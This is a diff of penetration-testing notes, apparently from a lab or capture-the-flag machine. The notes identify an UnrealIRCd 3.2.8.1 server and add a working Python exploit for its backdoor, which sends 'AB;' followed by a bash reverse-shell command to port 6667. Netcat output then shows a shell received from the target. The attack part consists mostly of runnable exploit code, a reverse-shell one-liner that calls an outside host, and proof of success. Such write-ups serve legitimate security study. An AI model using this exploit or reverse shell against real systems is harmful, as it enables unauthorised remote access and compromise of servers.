@@ -11,7 +11,7 @@ PORT     STATE SERVICE
 
 
 
-#use irssi to access the irc server, got the version is 3.2.8.1
+#use irssi to access the irc server, got the Unreal version is 3.2.8.1
 
 
  Irssi v1.4.5 - https://irssi.org                                                                                           
@@ -39,3 +39,42 @@ PORT     STATE SERVICE
 19:26 -!- Mode change [+iwx] for user edk
 19:26 -!- You may not reregister
 
+
+
+
+
+
+#create a script, and listening on 2212 port, got a shell
+
+└─$ cat co.py                
+import socket
+
+payl='AB; bash -c "bash -i >& /dev/tcp/10.8.0.17/2212 0>&1";'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect(('172.16.33.78',6667))
+
+#s.send('dasd'.encode())
+
+tmp = s.recv(1024).decode()
+
+print(tmp)
+
+s.send(payl.encode())
+
+tmp = s.recv(1024).decode()
+
+print(tmp)
+
+└─$ python3 co.py            
+:irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
+
+:irc.foonet.com NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+
+└─$ nc -nvlp 2212       
+listening on [any] 2212 ...
+connect to [10.8.0.17] from (UNKNOWN) [172.16.33.78] 45946
+bash: cannot set terminal process group (313): Inappropriate ioctl for device
+bash: no job control in this shell
+server@noontide:~/irc/Unreal3.2$ 
